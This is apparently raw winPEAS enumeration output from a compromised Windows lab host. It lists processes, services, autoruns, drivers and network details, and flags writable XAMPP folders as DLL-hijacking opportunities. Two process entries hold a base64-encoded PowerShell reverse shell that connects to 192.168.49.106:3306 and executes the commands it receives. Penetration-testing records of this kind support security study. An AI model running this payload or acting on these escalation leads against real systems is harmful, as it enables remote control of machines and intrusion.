    Command Line: powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMAA2ACIALAAzADMAMAA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==                                                                                                                                       
   =================================================================================================                                                                    

    conhost(6832)[C:\WINDOWS\system32\conhost.exe] -- POwn: shenzi
    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
   =================================================================================================

    svchost(6240)[C:\WINDOWS\system32\svchost.exe] -- POwn: shenzi
    Command Line: C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    httpd(6824)[c:\xampp\apache\bin\httpd.exe] -- POwn: shenzi
    Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking folder: c:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])
    Command Line: c:\xampp\apache\bin\httpd.exe
   =================================================================================================                                                                    

    WinStore.App(5040)[C:\Program Files\WindowsApps\Microsoft.WindowsStore_12010.1001.2.0_x64__8wekyb3d8bbwe\WinStore.App.exe] -- POwn: shenzi
    Command Line: "C:\Program Files\WindowsApps\Microsoft.WindowsStore_12010.1001.2.0_x64__8wekyb3d8bbwe\WinStore.App.exe" -ServerName:App.AppXc75wvwned5vhz4xyxxecvgdjhdkgsdza.mca                                                                                                                                                             
   =================================================================================================                                                                    

    vmtoolsd(6416)[C:\Program Files\VMware\VMware Tools\vmtoolsd.exe] -- POwn: shenzi
    Command Line: "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
   =================================================================================================                                                                    

    httpd(7000)[C:\xampp\apache\bin\httpd.exe] -- POwn: shenzi
    Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])
    Command Line: C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache
   =================================================================================================

    RuntimeBroker(1892)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: shenzi
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    xampp-control(6788)[C:\xampp\xampp-control.exe] -- POwn: shenzi
    Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\xampp (Authenticated Users [WriteData/CreateFiles])
    Command Line: "C:\xampp\xampp-control.exe" 
   =================================================================================================                                                                    

    mysqld(6840)[c:\xampp\mysql\bin\mysqld.exe] -- POwn: shenzi
    Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking folder: c:\xampp\mysql\bin (Authenticated Users [WriteData/CreateFiles])
    Command Line: "c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone
   =================================================================================================                                                                    

    conhost(1048)[C:\WINDOWS\system32\conhost.exe] -- POwn: shenzi
    Command Line: \??\C:\WINDOWS\system32\conhost.exe 0x4
   =================================================================================================

    ApplicationFrameHost(4660)[C:\WINDOWS\system32\ApplicationFrameHost.exe] -- POwn: shenzi
    Command Line: C:\WINDOWS\system32\ApplicationFrameHost.exe -Embedding
   =================================================================================================

    RuntimeBroker(4000)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: shenzi
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    RuntimeBroker(5180)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: shenzi
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    svchost(4968)[C:\WINDOWS\system32\svchost.exe] -- POwn: shenzi
    Command Line: C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
   =================================================================================================

    RuntimeBroker(5956)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: shenzi
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    svchost(4180)[C:\WINDOWS\system32\svchost.exe] -- POwn: shenzi
    Command Line: C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
   =================================================================================================

    cmd(2392)[C:\WINDOWS\SYSTEM32\cmd.exe] -- POwn: shenzi
    Command Line: cmd.exe /c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMAA2ACIALAAzADMAMAA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="                                                                                                                           
   =================================================================================================                                                                    

    YourPhone(5928)[C:\Program Files\WindowsApps\Microsoft.YourPhone_1.20101.84.0_x64__8wekyb3d8bbwe\YourPhone.exe] -- POwn: shenzi
    Command Line: "C:\Program Files\WindowsApps\Microsoft.YourPhone_1.20101.84.0_x64__8wekyb3d8bbwe\YourPhone.exe" -ServerName:App.AppX9yct9q388jvt4h7y0gn06smzkxcsnt8m.mca                                                                                                                                                                     
   =================================================================================================                                                                    

    svchost(4148)[C:\WINDOWS\system32\svchost.exe] -- POwn: shenzi
    Command Line: C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
   =================================================================================================



  ========================================(Services Information)========================================

  [+] Interesting Services -non Microsoft-
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                                                                                 
    ssh-agent(OpenSSH Authentication Agent)[C:\WINDOWS\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================                                                                    

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    Alias Manager and Ticket Service
   =================================================================================================                                                                    

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================                                                                    

    VMwareCAFCommAmqpListener(VMware CAF AMQP Communication Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"] - Manual - Stopped
    VMware Common Agent AMQP Communication Service
   =================================================================================================                                                                    

    VMwareCAFManagementAgentHost(VMware CAF Management Agent Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"] - Manual - Stopped
    VMware Common Agent Management Agent Service
   =================================================================================================                                                                    


  [+] Modifiable Services
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    You cannot modify any service

  [+] Looking if you can modify any service registry
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    [-] Looks like you cannot change the registry of any service...

  [+] Checking write permissions in PATH folders (DLL Hijacking)
   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
    C:\WINDOWS\system32
    C:\WINDOWS
    C:\WINDOWS\System32\Wbem
    C:\WINDOWS\System32\WindowsPowerShell\v1.0\
    C:\WINDOWS\System32\OpenSSH\


  ====================================(Applications Information)====================================

  [+] Current Active Window Application
    Program Manager

  [+] Installed Applications --Via Program Files/Uninstall registry--
   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
    C:\Program Files (x86)\Microsoft\Edge\Application
    ==>  C:\Program Files (x86)\Microsoft\Edge\Application\SetupMetrics\20211203081258.pma (Authenticated Users [DeleteSubdirectoriesAndFiles])
    ==>  C:\Program Files (x86)\Microsoft\Edge\Application\SetupMetrics\20211203081300.pma (Authenticated Users [DeleteSubdirectoriesAndFiles])
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Microsoft Update Health Tools
    C:\Program Files\ModifiableWindowsApps
    C:\Program Files\PCHealthCheck
    C:\Program Files\ruxim
    C:\Program Files\Uninstall Information
    C:\Program Files\UNP
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\Windows NT
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell
    C:\xampp(Authenticated Users [WriteData/CreateFiles])


  [+] Autorun Applications
   [?] Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                             
Error getting autoruns from WMIC: System.ArgumentException: The path is not of a legal form.
   at System.IO.Path.NormalizePath(String path, Boolean fullCheck, Int32 maxPathLength, Boolean expandShortPaths)                                                       
   at System.IO.Path.InternalGetDirectoryName(String path)                                                                                                              
   at w1nP34S.ApplicationInfo.GetAutoRunsWMIC()                                                                                                                         

    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    Key: SecurityHealth
    Folder: C:\WINDOWS\system32
    File: C:\WINDOWS\system32\SecurityHealthSystray.exe
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    RegPerms: shenzi [TakeOwnership]
    Key: OneDrive
    Folder: C:\Users\shenzi\AppData\Local\Microsoft\OneDrive
    FolderPerms: shenzi [AllAccess]
    File: C:\Users\shenzi\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: shenzi [AllAccess]
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\IEXPLORE.EXE %1 (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Authenticated Users [AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\WINDOWS\system32
    File: C:\WINDOWS\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
    Key: StubPath
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\92.0.902.67\Installer
    File: C:\Program Files (x86)\Microsoft\Edge\Application\92.0.902.67\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge (Unquoted and Space detected)                                                                                                                                                   
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\WINDOWS\system32
    File: C:\WINDOWS\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\92.0.902.67\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\92.0.902.67\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\92.0.902.67\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\92.0.902.67\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\Users\shenzi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: shenzi [AllAccess]
    File: C:\Users\shenzi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    FilePerms: shenzi [AllAccess]
   =================================================================================================


    Folder: C:\Users\shenzi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: shenzi [AllAccess]
    File: C:\Users\shenzi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xampp-control - Shortcut.lnk
    FilePerms: shenzi [AllAccess]
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
   =================================================================================================


  [+] Scheduled Applications --Non Microsoft--
   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                                                                                 
Error: System.Resources.MissingManifestResourceException: Could not find any resources appropriate for the specified culture or the neutral culture.  Make sure "w1nP34S.Properties.Resources.resources" was correctly embedded or linked into assembly "winPEAS" at compile time, or that all the satellite assemblies required are loadable and fully signed.                                                                                                                                                         
   at System.Resources.ManifestBasedResourceGroveler.HandleResourceStreamMissing(String fileName)                                                                       
   at System.Resources.ManifestBasedResourceGroveler.GrovelForResourceSet(CultureInfo culture, Dictionary`2 localResourceSets, Boolean tryParents, Boolean createIfNotExists, StackCrawlMark& stackMark)                                                                                                                                        
   at System.Resources.ResourceManager.InternalGetResourceSet(CultureInfo requestedCulture, Boolean createIfNotExists, Boolean tryParents, StackCrawlMark& stackMark)   
   at System.Resources.ResourceManager.InternalGetResourceSet(CultureInfo culture, Boolean createIfNotExists, Boolean tryParents)                                       
   at System.Resources.ResourceManager.GetString(String name, CultureInfo culture)                                                                                      
   at Microsoft.Win32.TaskScheduler.TimeTrigger.V2GetTriggerString()                                                                                                    
   at Microsoft.Win32.TaskScheduler.Trigger.ToString()                                                                                                                  
   at System.Text.StringBuilder.AppendFormatHelper(IFormatProvider provider, String format, ParamsArray args)                                                           
   at System.String.FormatHelper(IFormatProvider provider, String format, ParamsArray args)                                                                             
   at w1nP34S.ApplicationInfo.<GetScheduledAppsNoMicrosoft>g__ActOnTask|9_1(Task t, <>c__DisplayClass9_0& )                                                             
   at w1nP34S.ApplicationInfo.<GetScheduledAppsNoMicrosoft>g__EnumFolderTasks|9_0(TaskFolder fld, <>c__DisplayClass9_0& )                                               
   at w1nP34S.ApplicationInfo.<GetScheduledAppsNoMicrosoft>g__EnumFolderTasks|9_0(TaskFolder fld, <>c__DisplayClass9_0& )                                               
   at w1nP34S.ApplicationInfo.<GetScheduledAppsNoMicrosoft>g__EnumFolderTasks|9_0(TaskFolder fld, <>c__DisplayClass9_0& )                                               
   at w1nP34S.ApplicationInfo.<GetScheduledAppsNoMicrosoft>g__EnumFolderTasks|9_0(TaskFolder fld, <>c__DisplayClass9_0& )                                               
   at w1nP34S.ApplicationInfo.GetScheduledAppsNoMicrosoft()                                                                                                             

  [+] Device Drivers --Non Microsoft--
   [?] Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#vulnerable-drivers
Error: System.ArgumentNullException: Value cannot be null.
Parameter name: input                                                                                                                                                   
   at System.Text.RegularExpressions.Regex.IsMatch(String input)                                                                                                        
   at w1nP34S.ApplicationInfo.GetDeviceDriversNoMicrosoft()                                                                                                             
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    VMware vSockets Service - 9.8.12.0 build-8538197 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware PCI VMCI Bus Device - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.20.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.710.10.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoft? Windows? Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoft? Windows? Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
     Promise? SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1015 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys                                                                                                                                                                       
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.1.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Pointing PS/2 Device Driver - 12.5.7.0 build-3574480 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 8.16.01.0024 - build-12210530 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 8.16.01.0024 - build-12210530 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware server memory controller - 7.4.2.0 build-5980934 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.9.2.0 build-17964782 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys


  =========================================(Network Information)=========================================

  [+] Network Shares
    IPC$ (Path: )
    Shenzi (Path: C:\Shenzi)

  [+] Host File

  [+] Network Ifaces and known hosts
   [?] The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:BA:E3:95]: 192.168.106.55 / 255.255.255.0
        Gateways: 192.168.106.254
        DNSs: 192.168.106.254
        Known hosts:
          192.168.106.254       00-50-56-BA-5B-F1     Dynamic
          192.168.106.255       FF-FF-FF-FF-FF-FF     Static
          192.168.120.254       00-00-00-00-00-00     Invalid
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          224.0.0.251           00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


